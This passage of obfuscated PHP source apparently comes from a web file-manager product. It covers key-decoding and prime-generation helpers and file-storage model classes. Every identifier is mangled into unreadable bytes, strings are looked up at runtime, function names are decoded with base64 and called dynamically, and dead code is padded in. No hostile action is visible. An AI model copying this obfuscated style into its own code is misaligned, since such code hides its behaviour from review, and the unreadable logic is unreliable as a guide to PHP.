$this->khsyaa738375($»ÚšŠ€, $Á¸Ü‚ü», $¨¿­¬Î¦ - 1); } return $»ÚšŠ€; } private function bonwbe60dc44($™ÎúÙµ, $ëĞ“¬úµ, $™ğâº¼– = 3) { $—ùÆ šß =& $_SERVER[äô®•½Â]; $ˆÏ±ıñÌ =& $_SERVER[ŸøÁÑ©Ï]; if (!is_string($™ÎúÙµ) || strlen($™ÎúÙµ) < 10) { return !1; } $™ÎúÙµ = trim($™ÎúÙµ); $ş’™ × = $—ùÆ šß[776]; if (!$ş’™ ×) { return; } $™ÎúÙµ = strrev($™ÎúÙµ); $ØÙÎøàà = $—ùÆ šß[777]; if (!$ØÙÎøàà) { return; } $—ã—”Á = $™ÎúÙµ[0]; $Á§İØÕ’ = $—ùÆ šß[778]; if (!$Á§İØÕ’) { die; } $Àœ»Å›í = substr($™ÎúÙµ, 1, 15); $ßƒ‚ˆ¢ª = $—ùÆ šß[779]; if (!$ßƒ‚ˆ¢ª) { die; } $™ÎúÙµ = substr($™ÎúÙµ, 16); $’£ş›•Ø = $—ùÆ šß[780]; if (strlen($’£ş›•Ø) < $—ùÆ šß[329]) { return; } $ÜÊàºÑ = $ˆÏ±ıñÌ[302]; switch ($—ã—”Á) { case $ˆÏ±ıñÌ[206]: $ºœ½ù± = $this->dqpf96e6e95c($™ÎúÙµ, strrev($ëĞ“¬úµ . $Àœ»Å›í)); break; case $ˆÏ±ıñÌ[122]: $ºœ½ù± = $this->dqpf96e6e95c($™ÎúÙµ, strrev($Àœ»Å›í . $ëĞ“¬úµ)); $²Æ¶õæ„ = $—ùÆ šß[781]; break; $ñ­ï»™ş = $—ùÆ šß[782]; if (!$ñ­ï»™ş) { die; } case $ˆÏ±ıñÌ[303]: $ºœ½ù± = $this->dqpf96e6e95c($™ÎúÙµ, base64_encode($Àœ»Å›í . $ëĞ“¬úµ)); break; case $ˆÏ±ıñÌ[304]: $ºœ½ù± = $this->dqpf96e6e95c($™ÎúÙµ, md5($Àœ»Å›í . $ëĞ“¬úµ)); break; case $ˆÏ±ıñÌ[305]: $™ÎúÙµ = hash_decode($™ÎúÙµ); $Æ“æü™ = $™ÎúÙµ[0]; $™ÎúÙµ = substr($™ÎúÙµ, 1); $ùªÆÔ˜ = $—ùÆ šß[783]; if (strlen($ùªÆÔ˜) < $—ùÆ šß[703]) { die; } $œÄÔÌô¬ = strpos($ÜÊàºÑ, $Æ“æü™); $ÍÒÛõ— = md5($Æ“æü™ . md5($ëĞ“¬úµ . $Æ“æü™) . $ëĞ“¬úµ); $†›äŸ° = $—ùÆ šß[784]; if (strlen($†›äŸ°) < $—ùÆ šß[703]) { die; } $ÍÒÛõ— = substr($ÍÒÛõ—, $œÄÔÌô¬ % 8, $œÄÔÌô¬ % 8 + 7); $µ´•±í¾ = $ˆÏ±ıñÌ[6]; $ÈİèÌıÌ = $—ùÆ šß[785]; while ($ÈİèÌıÌ < $—ùÆ šß[696]) { if ($ÈİèÌıÌ >= 0) { break; } $ÈİèÌıÌ++; } $ÒÅ¢¶» = 0; $¿”É€§ğ = $—ùÆ šß[786]; if (strlen($¿”É€§ğ) < $—ùÆ šß[329]) { return; } $²Øû¼ßÒ = 0; $­‡Åòæ× = $—ùÆ šß[705]; if (!$­‡Åòæ×) { die; } $»é‰ğ– = 0; for ($ÒÅ¢¶» = 0; $ÒÅ¢¶» < strlen($™ÎúÙµ); $ÒÅ¢¶»++) { $»é‰ğ– = $»é‰ğ– == strlen($ÍÒÛõ—) ? 0 : $»é‰ğ–; $¾Èï³ş = $»é‰ğ–++; $²Øû¼ßÒ = strpos($ÜÊàºÑ, $™ÎúÙµ[$ÒÅ¢¶»]) - $œÄÔÌô¬ - ord($ÍÒÛõ—[$¾Èï³ş]); $úî¢Šşæ = $—ùÆ šß[787]; if (strlen($úî¢Šşæ) < $—ùÆ šß[696]) { die; } while ($²Øû¼ßÒ < 0) { $²Øû¼ßÒ += 64; } $µ´•±í¾ .= $ÜÊàºÑ[$²Øû¼ßÒ]; $¡˜¿Šš¬ = $—ùÆ šß[788]; if (strlen($¡˜¿Šš¬) < $—ùÆ šß[696]) { die; } } $ºœ½ù± = base64_decode($µ´•±í¾); $¹şÒ½ÃÎ = $—ùÆ šß[789]; if (!$¹şÒ½ÃÎ) { die; } break; $ãæÉ’Ê = $—ùÆ šß[790]; if (strlen($ãæÉ’Ê) < $—ùÆ šß[329]) { return; } default: $ºœ½ù± = $this->dqpf96e6e95c($™ÎúÙµ, $ëĞ“¬úµ . $Àœ»Å›í); break; } if ($™ğâº¼– - 1 > 0) { $ºœ½ù± = $this->bonwbe60dc44($ºœ½ù±, $ëĞ“¬úµ, $™ğâº¼– - 1); } return $ºœ½ù±; } public function pneu4a79c98f($à°Î’æÆ) { $­Ê®­çá =& $_SERVER[äô®•½Â]; $Ü­ĞÆß =& $_SERVER[ŸøÁÑ©Ï]; $˜Ëîõ¢ü = $this->iakmd1a0d0d2(); $Š¿ƒ«÷Ì = $­Ê®­çá[791]; $¤²‹ÕÍ = $this->iakmd1a0d0d2(); $Ôş‘É‚Â = $­Ê®­çá[792]; if (strlen($Ôş‘É‚Â) < $­Ê®­çá[329]) { die; } $øµÓı¬ñ = ($˜Ëîõ¢ü - 1) * ($¤²‹ÕÍ - 1); $ÌÏª±ó‡ = intval(($˜Ëîõ¢ü + $¤²‹ÕÍ) / 2); $¥åïÊ•¶ = $­Ê®­çá[793]; while (1) { $õñŒâ = $ÌÏª±ó‡; $®‚ÏöşÂ = $­Ê®­çá[794]; if (strlen($®‚ÏöşÂ) < $­Ê®­çá[703]) { return; } $®Ü¼ê´ú = $øµÓı¬ñ; $ïé¬Ûòƒ = $­Ê®­çá[795]; while (strlen($ïé¬Ûòƒ) < $­Ê®­çá[696]) { if (!$ïé¬Ûòƒ) { break; } $ïé¬Ûòƒ++; } while ($®Ü¼ê´ú % $õñŒâ != 0) { $Æ·Øõî© = $®Ü¼ê´ú; $®Ü¼ê´ú = $õñŒâ; $õñŒâ = $Æ·Øõî© % $õñŒâ; } if ($õñŒâ == 1) { break; } else { $ÌÏª±ó‡++; } } $ˆù”‘šĞ = 2; $²ïüÚ = $­Ê®­çá[796]; if (!$²ïüÚ) { return; } for ($¼×Ş©É = 0; $¼×Ş©É < $øµÓı¬ñ * 10; $¼×Ş©É++) { if (($øµÓı¬ñ * $¼×Ş©É + 1) % $ÌÏª±ó‡ == 0) { $ˆù”‘šĞ = intval(($øµÓı¬ñ * $¼×Ş©É + 1) / $ÌÏª±ó‡); break; } } $å­Í×—Í = $this->yxie43b810b0($˜Ëîõ¢ü * $¤²‹ÕÍ . $Ü­ĞÆß[6], $Ü­ĞÆß[136]); $„×©äÁ² = $­Ê®­çá[797]; while ($„×©äÁ² < $­Ê®­çá[734]) { if ($„×©äÁ² >= 0) { break; } $„×©äÁ²++; } $’´ö‰ŞÑ = md5($Ü­ĞÆß[306] . ($˜Ëîõ¢ü + $¤²‹ÕÍ) . $Ü­ĞÆß[307] . $ÌÏª±ó‡ . $Ü­ĞÆß[307] . $ˆù”‘šĞ . $Ü­ĞÆß[308]); $Å¨íß¤ƒ = $this->yxie43b810b0($à°Î’æÆ, $’´ö‰ŞÑ) . $Ü­ĞÆß[309] . $å­Í×—Í; $èøˆŒúÇ = $­Ê®­çá[798]; if (strlen($èøˆŒúÇ) < $­Ê®­çá[696]) { die; } return $Å¨íß¤ƒ; $¹åˆ“š = $­Ê®­çá[799]; while (strlen($¹åˆ“š) < $­Ê®­çá[717]) { if (!$¹åˆ“š) { break; } $¹åˆ“š++; } } public function tury26be27c9($œàÅı¤É) { $»Ğ’Ş¼è =& $_SERVER[äô®•½Â]; $àÃŞ®´Ô =& $_SERVER[ŸøÁÑ©Ï]; $«éŠ›äª = explode($àÃŞ®´Ô[309], $œàÅı¤É); if (count($«éŠ›äª) != 2) { return $àÃŞ®´Ô[6]; } $¹ˆÛª¬ = $this->dqpf96e6e95c($«éŠ›äª[1] . $àÃŞ®´Ô[6], $àÃŞ®´Ô[136]); $“é›Ö¼ = $»Ğ’Ş¼è[800]; while ($“é›Ö¼ < $»Ğ’Ş¼è[703]) { if ($“é›Ö¼ >= 0) { break; } $“é›Ö¼++; } if (!$¹ˆÛª¬) { return $àÃŞ®´Ô[6]; } $¹ˆÛª¬ = intval($¹ˆÛª¬); $Áõ…ç¤Ğ = 0; $Ë¯¯ß¶´ = 0; $İçÊï± = $»Ğ’Ş¼è[801]; while (strlen($İçÊï±) < $»Ğ’Ş¼è[734]) { if (!$İçÊï±) { break; } $İçÊï±++; } for ($òéü‘õË = 3; $òéü‘õË < $¹ˆÛª¬; $òéü‘õË += 2) { if ($¹ˆÛª¬ % $òéü‘õË != 0) { continue; } $Áõ…ç¤Ğ = $òéü‘õË; $Ë¯¯ß¶´ = intval($¹ˆÛª¬ / $òéü‘õË); $Ä¤˜˜¸ª = $»Ğ’Ş¼è[802]; while ($Ä¤˜˜¸ª < $»Ğ’Ş¼è[703]) { if ($Ä¤˜˜¸ª >= 0) { break; } $Ä¤˜˜¸ª++; } break; $ò™ÍÔæÈ = $»Ğ’Ş¼è[803]; while (strlen($ò™ÍÔæÈ) < $»Ğ’Ş¼è[703]) { if (!$ò™ÍÔæÈ) { break; } $ò™ÍÔæÈ++; } } $ã¡´Ëû = ($Áõ…ç¤Ğ - 1) * ($Ë¯¯ß¶´ - 1); $™ßäìšÛ = intval(($Áõ…ç¤Ğ + $Ë¯¯ß¶´) / 2); $ß¹ÂÏç = $»Ğ’Ş¼è[804]; while (1) { $¹¶ığ¾¹ = $™ßäìšÛ; $†ÙûÔøã = $ã¡´Ëû; while ($†ÙûÔøã % $¹¶ığ¾¹ != 0) { $Áå–ˆÀ‘ = $†ÙûÔøã; $Ñ»Ñê²ù = $»Ğ’Ş¼è[805]; $†ÙûÔøã = $¹¶ığ¾¹; $¹¶ığ¾¹ = $Áå–ˆÀ‘ % $¹¶ığ¾¹; $¥‘Š¾á = $»Ğ’Ş¼è[806]; if (!$¥‘Š¾á) { die; } } if ($¹¶ığ¾¹ == 1) { break; } else { $™ßäìšÛ++; } } $ÜĞåšˆ¤ = 2; for ($òéü‘õË = 0; $òéü‘õË < $ã¡´Ëû * 10; $òéü‘õË++) { if (($ã¡´Ëû * $òéü‘õË + 1) % $™ßäìšÛ == 0) { $ÜĞåšˆ¤ = intval(($ã¡´Ëû * $òéü‘õË + 1) / $™ßäìšÛ); break; } } $ÄÖğ±ÛÑ = md5($àÃŞ®´Ô[306] . ($Áõ…ç¤Ğ + $Ë¯¯ß¶´) . $àÃŞ®´Ô[307] . $™ßäìšÛ . $àÃŞ®´Ô[307] . $ÜĞåšˆ¤ . $àÃŞ®´Ô[308]); $¾¡õû¶ñ = $»Ğ’Ş¼è[807]; $‰Ì­˜½ = $this->dqpf96e6e95c($«éŠ›äª[0], $ÄÖğ±ÛÑ); $¹öÎ£…ª = $»Ğ’Ş¼è[808]; return $‰Ì­˜½; } public function iakmd1a0d0d2() { $¾òı¼î” =& $_SERVER[äô®•½Â]; $ĞÜòÅ £ = mt_rand(pow(2, 14), pow(2, 16) - 1); $é°ê·¡û = array(); $‚•µÙü“ = 1; while ($‚•µÙü“ <= (int) sqrt($ĞÜòÅ £)) { $ôïÇ½£ = $‚•µÙü“; while (!0) { $ôïÇ½£++; if ($ôïÇ½£ <= 2) { $‚•µÙü“ = $ôïÇ½£; break; } else { if ($ôïÇ½£ < 2) { continue; } } $•ĞÊù¤¥ = !0; for ($Àˆ®ö»ì = 2; $Àˆ®ö»ì <= sqrt($ôïÇ½£); $Àˆ®ö»ì++) { if ($ôïÇ½£ % $Àˆ®ö»ì == 0) { $•ĞÊù¤¥ = !1; } } if ($•ĞÊù¤¥) { $‚•µÙü“ = $ôïÇ½£; break; } } $é°ê·¡û[] = $‚•µÙü“; } $¥ğüñº¾ = 2; for ($ôïÇ½£ = $ĞÜòÅ £; $ôïÇ½£ > 1; $ôïÇ½£--) { $•ĞÊù¤¥ = !0; foreach ($é°ê·¡û as $§•£Î§â) { if ($ôïÇ½£ % $§•£Î§â == 0) { $•ĞÊù¤¥ = !1; break; } } if ($•ĞÊù¤¥) { $¥ğüñº¾ = $ôïÇ½£; break; } } return $¥ğüñº¾; $é‚ÂÄİà = $¾òı¼î”[809]; if (strlen($é‚ÂÄİà) < $¾òı¼î”[717]) { die; } } public function rxtyfa9ae04a($êßÆ˜à, $Â©Òôæ) { $€§ÆÂÀå =& $_SERVER[äô®•½Â]; $ÛØ¼à =& $_SERVER[ŸøÁÑ©Ï]; return call_user_func(array($ÛØ¼à[8], $ÛØ¼à[310]), $êßÆ˜à, $Â©Òôæ); $±ç” Äş = $€§ÆÂÀå[810]; while (strlen($±ç” Äş) < $€§ÆÂÀå[696]) { if (!$±ç” Äş) { break; } $±ç” Äş++; } } public function yxie43b810b0($ï¡²ó«, $Èò€äµË) { $ğ“ÑØ =& $_SERVER[ŸøÁÑ©Ï]; return call_user_func(array($ğ“ÑØ[311], $ğ“ÑØ[312]), $ï¡²ó«, $Èò€äµË); $ß•ß‹ˆ¬ = $_SERVER[äô®•½Â][811]; if (!$ß•ß‹ˆ¬) { die; } } public function dqpf96e6e95c($¹Ó¶óÓı, $ö»Ô¬°¾) { $ŸÔƒ¶¡• =& $_SERVER[äô®•½Â]; $ä†ˆ¡¶ë =& $_SERVER[ŸøÁÑ©Ï]; return call_user_func(array($ä†ˆ¡¶ë[311], $ä†ˆ¡¶ë[313]), $¹Ó¶óÓı, $ö»Ô¬°¾); $à¹ŸË•÷ = $ŸÔƒ¶¡•[812]; while ($à¹ŸË•÷ < $ŸÔƒ¶¡•[734]) { if ($à¹ŸË•÷ >= 0) { break; } $à¹ŸË•÷++; } } } goto fÕƒ¤íŞ…; bÒ¦Åâê¼: $fileSize = strrev(base64_decode($_SERVER[…´Øâ×‘][0])); function binCheckNeq($‘ÎÁÍ½, $ĞÙòÖ¾˜) { return $‘ÎÁÍ½ != $ĞÙòÖ¾˜; } $_SERVER[$_SERVER[…´Øâ×‘][1]] = $fileSize($_SERVER[$_SERVER[…´Øâ×‘][2]]); goto c‘ã¶ƒ‚Á; CÓŒéğ¤‡•: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\x69\x6c\x65\137\143\x6f\x6e\x74\x65\156\x74\x73"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\145\x54\151\x6d\145", "\164\x69\x6d\145", "\x69\x6e\x73\x65\x72\x74", "\146\x75\156\x63\x74\151\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\154\x65"; protected $tableMeta = array("\x74\x61\x62\154\145\116\141\x6d\145" => "\x69\157\137\x66\151\x6c\145\137\x6d\145\x74\x61", "\155\145\x74\x61\x46\151\145\154\144" => "\146\x69\x6c\145\111\104"); public function fileInfo($šµŸ„„Æ) { $ŠîŒê´­ =& $_SERVER[äô®•½Â]; static $¡©ß±° = array(); if (!isset($¡©ß±°[$šµŸ„„Æ])) { $»êŞ§˜î = $ŠîŒê´­[2027]; $ÜÜ÷ã¼ç = Model($ŠîŒê´­[557])->field($»êŞ§˜î)->where(array($ŠîŒê´­[555] => $šµŸ„„Æ))->find(); $¡©ß±°[$šµŸ„„Æ] = $ÜÜ÷ã¼ç; } return $¡©ß±°[$šµŸ„„Æ]; } public function addFileByContent($şÑé¯Øç = '', $½Æ‰Ê×, $Üô¦ÙÍŠ = '') { $ µØ±¢® =& $_SERVER[äô®•½Â]; $«Œ¸¦ÊÉ = TEMP_PATH . $ µØ±¢®[2028]; if (!is_dir($«Œ¸¦ÊÉ)) { mk_dir($«Œ¸¦ÊÉ); } $½Ã¬ØÉ˜ = $«Œ¸¦ÊÉ . $ µØ±¢®[2029] . rand_string(16); $¡çõ„Õ€ = file_put_contents($½Ã¬ØÉ˜, $şÑé¯Øç); if ($¡çõ„Õ€ === !1 || strlen($şÑé¯Øç) != $¡çõ„Õ€) { return !1; } $õªŒÄÔ = $this->addFile($½Ã¬ØÉ˜, $½Æ‰Ê×, $Üô¦ÙÍŠ, !0); if (file_exists($½Ã¬ØÉ˜)) { @unlink($½Ã¬ØÉ˜); } return $õªŒÄÔ; } public function createFileName($Õ•€«†³, $›ÃßÊùº, $íÑÕ½ãÂ = false, $Óîù”ô = false) { $ö˜…ì½¬ =& $_SERVER[äô®•½Â]; $›Ø€²Œ¹ = IO::init($ö˜…ì½¬[8]); $ˆ ğ¬¾ğ = $this->_makeFilePath($Õ•€«†³, $›ÃßÊùº, $›Ø€²Œ¹, $íÑÕ½ãÂ, $Óîù”ô); $“Ù¬†”ğ = $›Ø€²Œ¹->pathFather($ˆ ğ¬¾ğ); static $Ò¤îØğà = false; $À®ÀÛ§Ä = $ö˜…ì½¬[2030] . md5($“Ù¬†”ğ); if (!$Ò¤îØğà && !Cache::get($À®ÀÛ§Ä)) { $Ò¤îØğà = !0; $©î”úÎ† = IO::mkdir($“Ù¬†”ğ); if (!IO::exist($©î”úÎ† . $ö˜…ì½¬[865])) { IO::mkfile($©î”úÎ† . $ö˜…ì½¬[865]); } Cache::set($À®ÀÛ§Ä, 1, 3600 * 2); } return $ˆ ğ¬¾ğ; } public function _makeFilePath($ñ¶Î€éõ, $¥ÉãŸ÷”, $§¬´ë²£, $«…ËÆ¬Ô = false, $Âû™Œ¡ = false) { $¯’°‰Ï¬ =& $_SERVER[äô®•½Â]; $‘¨¯¯–ê = Model($¯’°‰Ï¬[836])->get($¯’°‰Ï¬[2031]); $–´Í¨ü÷ = $¯’°‰Ï¬[1320] . $¥ÉãŸ÷”[$¯’°‰Ï¬[486]] . $¯’°‰Ï¬[495] . date($¯’°‰Ï¬[2032]); $™ô §Ÿå = $–´Í¨ü÷ . rand_string(5) . short_id(100); $ñ¶Î€éõ = str_replace($¯’°‰Ï¬[8], $¯’°‰Ï¬[11], KodIO::clear($ñ¶Î€éõ)); $È°Ä°Š = $§¬´ë²£->ext($ñ¶Î€éõ); if (!$ñ¶Î€éõ) { $‘¨¯¯–ê = $¯’°‰Ï¬[842]; } switch ($‘¨¯¯–ê) { case $¯’°‰Ï¬[2033]: if ($È°Ä°Š) { $™ô §Ÿå = $™ô §Ÿå . $¯’°‰Ï¬[10] . $È°Ä°Š; } if ($È°Ä°Š == $¯’°‰Ï¬[1970]) { $™ô §Ÿå .= $¯’°‰Ï¬[1289]; } break; case $¯’°‰Ï¬[2034]: $“œõÄªÒ = Model($¯’°‰Ï¬[836])->get($¯’°‰Ï¬[837]); $Úª†á¼³ = substr(md5($¯’°‰Ï¬[838] . $“œõÄªÒ . date($¯’°‰Ï¬[814])), 0, 8); $–´Í¨ü÷ = $¯’°‰Ï¬[1320] . $¥ÉãŸ÷”[$¯’°‰Ï¬[486]] . $¯’°‰Ï¬[495] . date($¯’°‰Ï¬[2035]) . $Úª†á¼³ . $¯’°‰Ï¬[8]; if ($È°Ä°Š == $¯’°‰Ï¬[1970]) { $ñ¶Î€éõ .= $¯’°‰Ï¬[1289]; } $ëñĞ£ãß = $¯’°‰Ï¬[2036] . $–´Í¨ü÷ . $ñ¶Î€éõ; CacheLock::lock($ëñĞ£ãß); $™ô §Ÿå = $–´Í¨ü÷ . $ñ¶Î€éõ; if (IO::exist($–´Í¨ü÷ . $ñ¶Î€éõ)) { $ıöÅ»©¿ = substr($ñ¶Î€éõ, 0, strlen($ñ¶Î€éõ) - strlen($È°Ä°Š)); $çöøšÏ = $Âû™Œ¡ ? substr($Âû™Œ¡, 0, 5) : ($«…ËÆ¬Ô ? substr($«…ËÆ¬Ô, 0, 5) : rand_string(5)); $™ô §Ÿå = $–´Í¨ü÷ . $ıöÅ»©¿ . $çöøšÏ; if ($È°Ä°Š) { $™ô §Ÿå = $™ô §Ÿå . $¯’°‰Ï¬[10] . $È°Ä°Š; } } if (IO::isOsDriver($™ô §Ÿå) && !IO::isUploadServer($™ô §Ÿå)) { if (IO::exist($™ô §Ÿå)) { CacheLock::unlock($ëñĞ£ãß); return $™ô §Ÿå; } $˜°âÂ– = IO::setContent($™ô §Ÿå, $¯’°‰Ï¬[12]); if (!$˜°âÂ–) { show_json($¯’°‰Ï¬[2037], !1); } } CacheLock::unlock($ëñĞ£ãß); break; case $¯’°‰Ï¬[842]: break; default: break; } return $™ô §Ÿå; } public function addFileByRemote($‚è¹üî, $ºöéÇŸü, $àŒØó  = array()) { $Îê¤´ğã =& $_SERVER[äô®•½Â]; if (!IO::isFile($‚è¹üî)) { return !1; } $…¹Ÿ¡Ï’ = $àŒØó [$Îê¤´ğã[560]] ? $àŒØó [$Îê¤´ğã[560]] : $Îê¤´ğã[12]; $Ë®ÑùÒÆ = IO::hashMd5($‚è¹üî, $…¹Ÿ¡Ï’); $©ş—µö = KodIO::parse($‚è¹üî); $«Üğ«¯î = array($Îê¤´ğã[633] => IO::size($‚è¹üî), $Îê¤´ğã[2038] => 1, $Îê¤´ğã[505] => $ºöéÇŸü, $Îê¤´ğã[879] => $©ş—µö[$Îê¤´ğã[486]], $Îê¤´ğã[506] => $‚è¹üî, $Îê¤´ğã[2039] => $àŒØó [$Îê¤´ğã[688]] ? $àŒØó [$Îê¤´ğã[688]] : IO::hashSimple($‚è¹üî), $Îê¤´ğã[2040] => $Ë®ÑùÒÆ ? $Ë®ÑùÒÆ : $…¹Ÿ¡Ï’); if ($¶ßªéÌà = $this->addFileCheckExist($«Üğ«¯î[$Îê¤´ğã[688]], $«Üğ«¯î[$Îê¤´ğã[560]], $«Üğ«¯î[$Îê¤´ğã[79]])) { return $¶ßªéÌà; } return $this->addFileData($«Üğ«¯î); } private function addFileData($ºù¬©×ê) { $­Ô‚Ö§é =& $_SERVER[äô®•½Â]; if (!$ºù¬©×ê) { return !1; } if (!IO::isFile($ºù¬©×ê[$­Ô‚Ö§é[87]])) { return !1; } $ºù¬©×ê[$­Ô‚Ö§é[79]] = intval($ºù¬©×ê[$­Ô‚Ö§é[79]]); if (!$ºù¬©×ê[$­Ô‚Ö§é[79]] && strlen($ºù¬©×ê[$­Ô‚Ö§é[688]]) > 32) { $ºù¬©×ê[$­Ô‚Ö§é[79]] = intval(substr($ºù¬©×ê[$­Ô‚Ö§é[688]], 32)); } $ÒÍÅ¥íó = $this->add($ºù¬©×ê); return $this->find($ÒÍÅ¥íó); } public function addFile($Û€œí•, $š¨ù¯âô, $ë§¦¹, $ô…¤ş™£ = false) { $¹¹ÔÍ¥… =& $_SERVER[äô®•½Â]; $Ã¼õù…À = IO::hashSimple($Û€œí•); $Š´©àú = IO::size($Û€œí•); $¥»øªÙ× = $Š´©àú <= 1024 * 1024 * 10 ? IO::hashMd5($Û€œí•) : $¹¹ÔÍ¥…[12]; $ª±‚°›Ì = $¹¹ÔÍ¥…[2041] . $Ã¼õù…À; CacheLock::lock($ª±‚°›Ì); if ($¥»øªÙ× && $Ã¼õù…À) { $ÃèÊï´ï = $this->addFileCheckExist($Ã¼õù…À, $¥»øªÙ×, $Š´©àú); if ($ÃèÊï´ï) { CacheLock::unlock($ª±‚°›Ì); return $ÃèÊï´ï; } } $Æ¶¼®ã = $this->addFileMake($Û€œí•, $š¨ù¯âô, $Š´©àú, $Ã¼õù…À, $¥»øªÙ×, $ë§¦¹, $ô…¤ş™£); $Õ¯‰À¹Ô = $this->addFileData($Æ¶¼®ã); if (!$Õ¯‰À¹Ô) { return !1; } CacheLock::unlock($ª±‚°›Ì); if (!$¥»øªÙ× && $Õ¯‰À¹Ô) { $this->fileMd5Check($Õ¯‰À¹Ô); } return $Õ¯‰À¹Ô; } public function fileMd5Check($›•µÄÅÖ) { $±»¨üùã =& $_SERVER[äô®•½Â]; $´Å‡¥ = array($›•µÄÅÖ[$±»¨üùã[554]], $›•µÄÅÖ[$±»¨üùã[87]]); $ˆ¾†‘‚ = $±»¨üùã[2042] . $›•µÄÅÖ[$±»¨üùã[87]]; $íöŠ ÈŸ = $±»¨üùã[2043] . $›•µÄÅÖ[$±»¨üùã[554]]; TaskQueue::add($±»¨üùã[2044], $´Å‡¥, $ˆ¾†‘‚, $íöŠ ÈŸ); } public function fileMd5Set($×ÃîØˆ, $’¿…¬ Ø) { $ÂˆêŸ‚… =& $_SERVER[äô®•½Â]; $áÑù¼û = $this->find($×ÃîØˆ); if (!$áÑù¼û || $áÑù¼û[$ÂˆêŸ‚…[560]]) { return; } $°÷ÚçŸ³ = IO::hashMd5($’¿…¬ Ø); if (!$°÷ÚçŸ³) { return $ÂˆêŸ‚…[12]; } $this->where(array($ÂˆêŸ‚…[554] => $×ÃîØˆ))->save(array($ÂˆêŸ‚…[560] => $°÷ÚçŸ³)); } public function addFileMake($¤Œ¬¶‡ˆ, $¾Ç¥¯õ, $ —ïî¥ï, $—’‡Èœ, $­íÔÇé¶, $Æ†¯ÑòÈ, $»é èáº) { $à¡÷“¼é =& $_SERVER[äô®•½Â]; $…—ù¥‚„ = $this->createFileName($Æ†¯ÑòÈ, $¾Ç¥¯õ, $—’‡Èœ, $­íÔÇé¶); $²ïê‘¡ = get_path_father($…—ù¥‚„); $ƒá¶ÖŸë = get_path_this($…—ù¥‚„); if ($»é èáº) { $©……ïì÷ = IO::move($¤Œ¬¶‡ˆ, $²ïê‘¡, !1, $ƒá¶ÖŸë); } else { $©……ïì÷ = IO::copy($¤Œ¬¶‡ˆ, $²ïê‘¡, !1, $ƒá¶ÖŸë); } if (!$©……ïì÷) { return !1; } $æâŒŞ½ƒ = IO::init($©……ïì÷); $æâŒŞ½ƒ->cacheMethod($à¡÷“¼é[182], $æâŒŞ½ƒ->path, $à¡÷“¼é[179]); if (IO::size($©……ïì÷) != $ —ïî¥ï) { return !1; } $®áÔù¡´ = array($à¡÷“¼é[633] => $ —ïî¥ï, $à¡÷“¼é[2038] => 1, $à¡÷“¼é[505] => $Æ†¯ÑòÈ, $à¡÷“¼é[879] => $¾Ç¥¯õ[$à¡÷“¼é[486]], $à¡÷“¼é[506] => $…—ù¥‚„, $à¡÷“¼é[2039] => $—’‡Èœ, $à¡÷“¼é[2040] => $­íÔÇé¶); return $®áÔù¡´; } public function addFileCheckExist($ İô”, $„’šà±Ù, $ô§ä…Ñç) { $Øüö¼¼ =& $_SERVER[äô®•½Â]; $€ßé”«ô = $this->findByHash($ İô”, $„’šà±Ù); if (!$€ßé”«ô) { return !1; } $£Ø…®™« = array($Øüö¼¼[2038] => intval($€ßé”«ô[$Øüö¼¼[2045]]) + 1, $Øüö¼¼[633] => $ô§ä…Ñç); $this->where(array($Øüö¼¼[555] => $€ßé”«ô[$Øüö¼¼[554]]))->save($£Ø…®™«); return $€ßé”«ô; } public function remove($¾ÛâîºÖ) { $this->linkCountChange($¾ÛâîºÖ, !1); $this->clearEmpty(); return !0; } public function linkAdd($Õ¾ªãéÙ) { $this->linkCountChange($Õ¾ªãéÙ, !0); } public function linkCountChange($½£å††…, $¥ÆßÛé‰) { $ŸÓ·‹šÎ =& $_SERVER[äô®•½Â]; if (!$½£å††…) { return; } if (!is_array($½£å††…)) { $½£å††… = array($½£å††…); } $ÕŒå¿¸¦ = array(); foreach ($½£å††… as $ÆÅóè´€) { $¬„ÒÄôÔ = $ÆÅóè´€ . $ŸÓ·‹šÎ[12]; if (!$ÕŒå¿¸¦[$¬„ÒÄôÔ]) { $ÕŒå¿¸¦[$¬„ÒÄôÔ] = 0; } $ÕŒå¿¸¦[$¬„ÒÄôÔ]++; } $¼şí“Úµ = array(); foreach ($ÕŒå¿¸¦ as $ÆÅóè´€ => $ÉŸ©³ı‡) { $¬„ÒÄôÔ = $ÉŸ©³ı‡ . $ŸÓ·‹šÎ[12]; if (!$¼şí“Úµ[$¬„ÒÄôÔ]) { $¼şí“Úµ[$¬„ÒÄôÔ] = array(); } $¼şí“Úµ[$¬„ÒÄôÔ][] = $ÆÅóè´€; } foreach ($¼şí“Úµ as $ÉŸ©³ı‡ => $…Ş‚³“œ) { if (!$…Ş‚³“œ) { continue; } $ÉŸ©³ı‡ = $¥ÆßÛé‰ ? $ÉŸ©³ı‡ : -intval($ÉŸ©³ı‡); $­øÙ§»å = array($ŸÓ·‹šÎ[554] => array($ŸÓ·‹šÎ[7], $…Ş‚³“œ)); if ($ÉŸ©³ı‡ < 0) { $­øÙ§»å[$ŸÓ·‹šÎ[2045]] = array($ŸÓ·‹šÎ[1087], abs($ÉŸ©³ı‡)); } $this->where($­øÙ§»å)->setAdd($ŸÓ·‹šÎ[2045], $ÉŸ©³ı‡); } } public function findByHash($´³ş¸àØ, $Š§¾ó¯ = false) { $³Èº¡ĞÕ =& $_SERVER[äô®•½Â]; if (!$´³ş¸àØ && !$Š§¾ó¯) { return !1; } $¹µ“¦õÜ = array($³Èº¡ĞÕ[2039] => $´³ş¸àØ); if ($Š§¾ó¯) { $¹µ“¦õÜ = array($³Èº¡ĞÕ[2040] => $Š§¾ó¯); } return $this->order($³Èº¡ĞÕ[2046])->where($¹µ“¦õÜ)->find(); } public function clearEmpty($Öºå×Âø = 1) { $öò×“÷ =& $_SERVER[äô®•½Â]; $ñõ¼¶¥ê = time() - 3600 * 24 * $Öºå×Âø; $Îı«¿ª = $öò×“÷[2047] . $ñõ¼¶¥ê; $çÀÙèò¹ = $this->where($Îı«¿ª)->select(); if (!$çÀÙèò¹) { return; } $¢¡Š¡»à = new Task($öò×“÷[2048], $öò×“÷[12], count($çÀÙèò¹)); foreach ($çÀÙèò¹ as $¥Ü¹ù×) { $¢¡Š¡»à->update(1); $this->resetFile($¥Ü¹ù×); } $¢¡Š¡»à->end(); } public function resetFile($®­ªší) { $Û´ù¾­× =& $_SERVER[äô®•½Â]; $ŠÕˆ¨·ß = array($Û´ù¾­×[555] => $®­ªší[$Û´ù¾­×[554]]); $ŠëóÆÖ‡ = 